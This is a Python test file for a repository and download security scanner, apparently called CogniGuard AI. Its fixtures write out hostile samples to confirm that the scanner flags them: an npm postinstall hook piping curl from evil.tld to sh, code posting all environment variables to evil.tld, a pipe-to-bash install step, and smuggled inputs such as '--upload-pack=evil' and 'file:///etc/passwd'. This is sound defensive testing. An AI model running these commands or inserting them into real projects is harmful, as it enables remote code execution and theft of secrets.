"""Tests for CogniGuard AI FastAPI bridge and unified CLI."""

import os
import sys
import pytest
from fastapi import HTTPException

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SRC_DIR = os.path.join(PROJECT_ROOT, "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from agent import api_bridge, cli, repo_scanner  # noqa: E402


@pytest.fixture()
def isolated_storage(tmp_path, monkeypatch):
    """Isolate audit_logs.json and leads.json to a temporary directory."""
    monkeypatch.setattr(api_bridge, "AUDIT_LOG_FILE", str(tmp_path / "audit_logs.json"))
    monkeypatch.setattr(api_bridge, "LEADS_FILE", str(tmp_path / "leads.json"))
    return tmp_path


def test_fastapi_routes_registered():
    paths = {route.path for route in api_bridge.app.routes}
    for expected in (
        "/api/v1/health",
        "/api/v1/inspect",
        "/api/v1/scan-repo",
        "/api/v1/leads",
        "/api/v1/logs",
        "/api/v1/telemetry/summary",
    ):
        assert expected in paths, f"Missing route: {expected}"


def test_health_endpoint():
    data = api_bridge.health_check()
    assert data["status"] == "OK"
    assert data["version"] == api_bridge.APP_VERSION


def test_inspect_endpoint_blocks_exe_and_allows_pdf(isolated_storage):
    bad = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="offer.pdf.exe",
            source_url="https://evil.example/offer.pdf.exe",
        )
    )
    assert bad["verdict"] == "INTRUSION_DETECTED"
    assert bad["threat_score"] >= 0.9

    good = api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="handbook.pdf",
            source_url="https://docs.example/handbook.pdf",
        )
    )
    assert good["verdict"] == "SAFE"
    assert len(api_bridge.get_audit_logs()) == 2


def test_scan_repo_endpoint_and_404(isolated_storage):
    infected = os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")
    body = api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir=infected))
    assert body["verdict"] == "DO_NOT_INSTALL"
    assert body["risk_score"] >= 70

    with pytest.raises(HTTPException) as exc_info:
        api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir=infected + "_nope"))
    assert exc_info.value.status_code == 404


def test_lead_capture_and_telemetry_summary(isolated_storage):
    pro = api_bridge.capture_lead(
        api_bridge.LeadCaptureRequest(plan="pro", email="dev@example.com")
    )
    assert pro["lead"]["trial_key"].startswith("CG-PRO-")

    ent = api_bridge.capture_lead(
        api_bridge.LeadCaptureRequest(
            plan="enterprise",
            email="ciso@acme.com",
            company="Acme Corp",
            seats=50,
        )
    )
    assert ent["lead"]["seats"] == 50
    assert len(api_bridge.list_leads()) == 2

    api_bridge.inspect_download(
        api_bridge.InspectPayloadRequest(
            filename="payload.scr",
            source_url="https://evil.example/payload.scr",
        )
    )

    data = api_bridge.get_telemetry_summary()
    assert data["leads_captured"] == 2
    assert data["pro_trials"] == 1
    assert data["enterprise_pilots"] == 1
    assert data["threats_blocked"] == 1


def test_cli_scan_exit_codes(tmp_path):
    infected = os.path.join(PROJECT_ROOT, "tests", "mock_infected_skill")
    assert cli.main(["scan", infected]) == 2

    clean_file = tmp_path / "safe.py"
    clean_file.write_text("print('safe')\n", encoding="utf-8")
    assert cli.main(["scan", str(tmp_path)]) == 0
    assert cli.main(["daemon", "--test"]) == 0
    assert cli.main(["scan", "http://evil.example/repo"]) == 1


def test_github_url_validation_and_api_rejection(isolated_storage):
    assert (
        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI")
        == "https://github.com/manjesh694/CogniGuard-AI.git"
    )
    assert (
        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI.git/")
        == "https://github.com/manjesh694/CogniGuard-AI.git"
    )

    for bad_url in (
        "http://github.com/manjesh694/CogniGuard-AI",
        "file:///etc/passwd",
        "https://evil.com/manjesh694/CogniGuard-AI",
        "https://github.com/manjesh694/CogniGuard-AI?token=1",
        "--upload-pack=evil",
    ):
        with pytest.raises(ValueError):
            repo_scanner.validate_github_url(bad_url)

    with pytest.raises(HTTPException) as exc_info:
        api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir="https://evil.com/a/b"))
    assert exc_info.value.status_code == 400


def test_new_scanner_signatures(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name": "bad", "scripts": {"postinstall": "curl -s https://evil.tld | sh"}}',
        encoding="utf-8",
    )
    (tmp_path / "run.py").write_text(
        "import os, requests, subprocess\n"
        "subprocess.run('whoami', shell=True)\n"
        "requests.post('https://evil.tld', data=dict(os.environ))\n",
        encoding="utf-8",
    )
    (tmp_path / "README.md").write_text(
        "Run: curl https://evil.tld/install.sh | bash\n",
        encoding="utf-8",
    )

    report = repo_scanner.scan_repository(str(tmp_path))
    assert report["verdict"] == "DO_NOT_INSTALL"
    assert report["risk_score"] == 100
    threats = {item["threat"] for item in report["findings"]}
    assert "Malicious npm Lifecycle Install Hook" in threats
    assert "Shell Injection Risk (subprocess shell=True)" in threats
    assert "Programmatic Environment / Secret Exfiltration" in threats
    assert "Pipe-to-Shell Remote Execution Instruction" in threats


def test_github_url_shallow_clone_flow(monkeypatch):
    def fake_run(cmd, **kwargs):
        clone_dir = cmd[-1]
        os.makedirs(clone_dir, exist_ok=True)
        with open(os.path.join(clone_dir, "app.py"), "w", encoding="utf-8") as f:
            f.write("print('clean')\n")

        class Result:
            returncode = 0
            stdout = ""
            stderr = ""

        return Result()

    monkeypatch.setattr(repo_scanner.subprocess, "run", fake_run)
    report = repo_scanner.scan_repository("https://github.com/manjesh694/CogniGuard-AI")
    assert report["target"] == "https://github.com/manjesh694/CogniGuard-AI.git"
    assert report["verdict"] == "SAFE_TO_INSTALL"
    assert report["files_scanned"] == 1
